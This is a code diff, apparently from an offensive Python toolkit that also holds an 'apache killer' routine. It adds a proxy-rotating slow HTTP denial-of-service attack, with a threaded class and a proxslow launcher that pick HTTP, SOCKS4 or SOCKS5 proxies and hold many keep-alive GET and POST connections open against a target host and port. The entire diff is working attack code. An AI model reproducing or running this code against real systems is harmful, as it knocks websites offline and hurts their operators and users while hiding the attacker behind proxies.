@@ -971,6 +971,111 @@ class apa(threading.Thread):
       print'Requests sent: {}'.format(counter)
    except:
     pass
+class ptc(threading.Thread):
+ def run(self):
+  global counter
+  x=pointer
+  while (stop!=True):
+   try:
+    z=random.randint(1,20)
+    if z<13:
+     line=random.choice(httplist)
+    elif (z in [13,14,15,16]):
+     line=random.choice(socks4list)
+    elif (z in [17,18,19,20]):
+     line=random.choice(socks5list)
+    ipp=line.split(":")[0].split("=")[0]
+    pp=line.split(":")[1].split("=")[0]
+    s =socks.socksocket()
+    if (z in [1,2,3,4,5,6,7,8,9,10,11,12]):
+     s.setproxy(socks.PROXY_TYPE_HTTP, str(ipp), int(pp), True)
+    elif (z in [13,14,15,16]):
+     s.setproxy(socks.PROXY_TYPE_SOCKS4, str(ipp), int(pp), True)
+    elif (z in [17,18,19,20]):
+     s.setproxy(socks.PROXY_TYPE_SOCKS5, str(ipp), int(pp), True)
+    s =socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((target,port))
+    while (stop!=True):
+     pa=random.choice(paths)
+     if "?" in pa:
+      jo='&'
+     else:
+      jo='?'
+     pa+=jo+str(random.randint(1,1000000000))+'='+str(random.randint(1,1000000000))
+     try:
+      g=random.randint(1,2)
+      if g==1:
+       s.send("GET {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nHost: {}\r\n\r\n".format(pa,random.choice(ua),random.randint(300,1000),target))
+      else:
+       q='q='
+       for i in range(10,random.randint(20,50)):
+        q+=random.choice(lis)
+       s.send("POST {} HTTP/1.1\r\nUser-Agent: {}\r\nAccept-language: en-US,en,q=0.5\r\nConnection: keep-alive\r\nKeep-Alive: {}\r\nContent-Length: {}\r\nContent-Type: application/x-www-form-urlencoded\r\nHost: {}\r\n\r\n{}".format(pa,random.choice(ua),random.randint(300,1000),len(q),target,q))
+      if prints==True:
+       print"Slow-->{}".format(ipp)
+      time.sleep(random.randint(sre1,sre2))
+     except:
+      break
+    s.close()
+   except Exception as e:
+    pass
+def proxslow(u,p=80,threads=500,maxtime=5,ampli=1,speed1=3,speed2=5,read1=1,read2=3,httpl=None,socks4l=None,socks5l=None,interval=300,logs=True,returning=False,settor=False):
+ global httplist
+ if httpl:
+  httplist=httpl
+ else:
+  httplist=masshttp()
+ global socks4list
+ if socks4l:
+  socks4list=socks4l
+ else:
+  socks4list=massocks4()
+ global socks5list
+ if socks5l:
+  socks5list=socks5l
+ else:
+  socks5list=massocks5()
+ global tor
+ tor=settor
+ global stop
+ stop=False
+ global prints
+ prints=logs
+ global target
+ target=u
+ global port
+ port=p
+ global timeout
+ timeout=maxtime
+ global amp
+ if ampli<1:
+  ampli=1
+ if ampli>100:
+  ampli=100
+ amp=ampli
+ global sre1
+ sre1=speed1
+ global sre2
+ sre2=speed2
+ global rre1
+ rre1=read1
+ global rre2
+ rre2=read2
+ for x in range(threads):
+  t=ptc()
+  t.start()
+ c=time.time()
+ while True:
+  try:
+   time.sleep(.1)
+   if int(time.time()-c)==interval:
+    stop=True
+    break
+  except KeyboardInterrupt:
+   stop=True
+   break
+ if returning==True:
+  return counter
 def apachekiller(u,p=80,threads=256,maxtime=5,roundmin=5,roundmax=15,level=1,interval=300,logs=True,returning=False,settor=False):
  '''
    this is a python version of the apache killer tool which was originally written in perl.
